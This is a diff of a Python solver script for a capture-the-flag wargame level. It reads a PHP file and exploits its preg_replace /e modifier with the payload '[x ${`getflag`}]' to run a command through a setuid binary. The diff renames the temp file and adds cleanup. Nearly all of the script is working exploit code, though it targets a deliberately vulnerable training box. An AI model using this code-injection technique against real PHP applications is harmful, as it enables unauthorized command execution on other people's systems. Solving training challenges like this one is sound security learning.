@@ -21,10 +21,12 @@ file_content = exec(client, 'cat level06.php', title='Read php file')
 print_output(file_content)
 print_title('Script read file from argv, /e Regexp mod, help us to execute our file instead just read, lets do this')
 
-exec(client, "echo '[x ${`getflag`}]' > /tmp/tricky_thing", title='Create magic file')
+exec(client, "echo '[x ${`getflag`}]' > /tmp/trick", title='Create magic file')
 
-token_raw = exec(client, './level06 /tmp/tricky_thing', title='Execute binary with our file via argv', err=True)[0]
+token_raw = exec(client, './level06 /tmp/trick', title='Execute binary with our file via argv', err=True)[0]
 print_output(token_raw)
+
+exec(client, 'rm -f /tmp/trick', title='Remove tmp file')
 
 token = sanitize_token(token_raw)
 save_token(token)
